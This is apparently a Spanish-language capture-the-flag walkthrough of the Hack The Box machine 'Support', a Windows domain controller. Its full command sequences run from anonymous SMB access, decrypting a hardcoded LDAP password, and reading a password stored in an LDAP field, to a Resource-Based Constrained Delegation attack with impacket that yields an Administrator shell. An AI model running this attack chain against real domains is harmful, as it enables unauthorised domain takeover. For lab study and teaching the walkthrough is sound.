![image](https://github.com/user-attachments/assets/b344a861-ea4f-4281-b3bf-5091b4714f54)# Enumeration

>Realizamos un escaneo de puertos TCP con mi herramienta automatizada de escaneo:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.230.181
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,445,464,593,3268,3269,5985,9389,49664,49667,49677,49690,49695,49716
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-20 15:22:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
| smb2-time: 
|   date: 2025-04-20T15:23:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.230.181 2>/dev/null                                         
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
```

> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "10.129.230.181 DC.support.htb support.htb" >> /etc/hosts
```

>Tratamos de enumerar las shares de SMB o el RPC mediante login anónimo pero no da resultados:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.230.181 -u '' -p '' --shares 2>/dev/null
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\: 
SMB         10.129.230.181  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "" -N 10.129.230.181
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit
```

>Si tratamos de listar las shares por SMB a un usuario anónimo de esta forma podemos ver una share interesante llamada support-tools:

```bash
┌──(kali㉿jbkira)-[~]
└─$ smbclient -L \\\\10.129.230.181\\ -U ""           
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

>Como podemos ver, podemos conectarnos y vemos un archivo zip interesante que vamos a descargarnos para analizarlo:

```bash
┌──(kali㉿jbkira)-[~]
└─$ smbclient \\\\10.129.230.181\\support-tools -U ""   
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 958720 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (471.3 KiloBytes/sec) (average 471.3 KiloBytes/sec)
```

>Si descomprimimos el zip podremos ver un ejecutable escrito en .NET por lo que podemos reversearlo empleando dnSpy.

>Al investigar en las funciones vemos que se conecta a un servidor ldap en el dominio y podemos ver el usuario que emplea:

![image](https://github.com/user-attachments/assets/9a429d1a-a1ce-40b0-a370-f80f5c1ac9df)

>Por otro lado, aquí podremos ver la contraseña que emplea el usuario aunque está encriptada, podemos ver que está encriptada con la key 'armando':

![image](https://github.com/user-attachments/assets/2f36791b-7b87-419f-a513-73fac75e644b)

>Por lo que vamos a desencriptarla, para ello emplearemos el siguiente script:

```bash
#!/bin/bash

ENC_PASSWORD="0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
KEY="armando"

# Decodificar base64
decoded=$(echo "$ENC_PASSWORD" | base64 -d | xxd -p -c 1000)

# Convertir a texto con XOR usando Perl
perl -e '
  use strict;
  use warnings;

  my $hex = $ARGV[0];
  my $key = $ARGV[1];
  my $bin = pack("H*", $hex);
  my $key_len = length($key);
  my $result = "";

  for (my $i = 0; $i < length($bin); $i++) {
      my $char = substr($bin, $i, 1);
      my $k = ord(substr($key, $i % $key_len, 1));
      my $decrypted = (ord($char) ^ $k ^ 223);
      $result .= chr($decrypted);
  }

  print "$result\n";
' "$decoded" "$KEY"

```

>Al ejecutarlo vemos que la contraseña es `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

>Vamos ahora a dumpear la información del servidor LDAP mediante ldapdomaindump ahora que tenemos credenciales válidas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.230.181
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

>Aquí podemos ver que el usuario support pertenece al grupo Remote Management Users que puede servirnos para ganar un foothold en el DC:

![image](https://github.com/user-attachments/assets/62174d6d-4b09-4c05-9477-dd0a5716ba69)

>Si realizamos una consulta ldap para ver la información de este usuario vemos lo que parecen unas credenciales en el campo info:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ ldapsearch -x -H ldap://10.129.230.181 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(sAMAccountName=support)"
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

>Probamos las credenciales y vemos que son válidas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ crackmapexec smb 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful' 2>/dev/null
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
```

>Por lo que vamos a conectarnos al servidor mediante WinRM ya que el usuario pertenece al grupo Remote Management Users:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.7
                                        
<SNIP>

*Evil-WinRM* PS C:\Users\support\Documents>
```

>Aquí podemos ver la flag user.txt:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> ls ../Desktop


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/20/2025   8:19 AM             34 user.txt
```

# Privilege Escalation

>Vamos a recolectar con bloodhound-python datos para analizar mediante bloodhound para ver posibles entradas a escalada de privilegios o movimiento lateral:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ bloodhound-python -u 'support' -ns 10.129.230.181 -d support.htb -c all 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Password: 
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 12S
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ zip support.zip 2025*      
  adding: 20250420120521_computers.json (deflated 74%)
  adding: 20250420120521_containers.json (deflated 93%)
  adding: 20250420120521_domains.json (deflated 76%)
  adding: 20250420120521_gpos.json (deflated 85%)
  adding: 20250420120521_groups.json (deflated 94%)
  adding: 20250420120521_ous.json (deflated 68%)
  adding: 20250420120521_users.json (deflated 96%)
```

>Abrimos bloodhound e iniciamos el servicio de neo4j, importando el archivo zip que hemos creado:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:27230). It is available at http://localhost:7474
There may be a short delay until the server is ready.
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ bloodhound &>/dev/null & disown                                        
[1] 27851
```

>Aquí vemos que el usuario support pertenece a un grupo que tiene privilegios GenericAll sobre el DC:

![image](https://github.com/user-attachments/assets/c4bf59cc-ea29-4ff1-acc3-8e9ac713b1b4)

>Esto puede ser explotado para realizar un ataque Resource-Based Constrained Delegation. El ataque Resource-Based Constrained Delegation (RBCD) permite a un atacante configurar delegación en un recurso dentro de Active Directory para que servicios controlados por él puedan suplantar identidades y acceder a otros servicios, facilitando así la escalada de privilegios.

>Primero deberemos agregar un equipo al AD, para ello emplearemos una herramienta de la suite de Impacket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ impacket-addcomputer -computer-name 'KALI$' -computer-pass 'Password123' -dc-host DC.support.htb -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account KALI$ with password Password123.
```

>Después, se otorgan permisos al equipo atacante para que pueda delegar autenticación hacia el equipo objetivo con una herramienta de la suite de impacket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ impacket-rbcd -delegate-from 'KALI$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] KALI$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     KALI$        (S-1-5-21-1677581083-3380853377-188903654-6101)
```

>Por último, obtendremos un TGS suplantando un usuario privilegiado, donde emplearemos la herramienta de Impacket getST.py para obtener un ticket de servicio suplantando a un administrador, este ataque también es conocido como S4U2Proxy (Service For User To Proxy).

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'Administrator' 'support.htb/kali$:Password123'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

>Empleamos el ticket agregándolo a la variable de entorno:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

>Ahora vamos a iniciar sesión mediante la herramienta de impacket wmiexec, dándonos una shell como el usuario impersonado Administrator

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/support]
└─$ impacket-wmiexec -k -dc-ip 10.129.230.181 dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator
```

>Ahora podemos ver la flag root.txt en su escritorio:

```powershell
C:\>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
04/20/2025  08:19 AM                34 root.txt
```
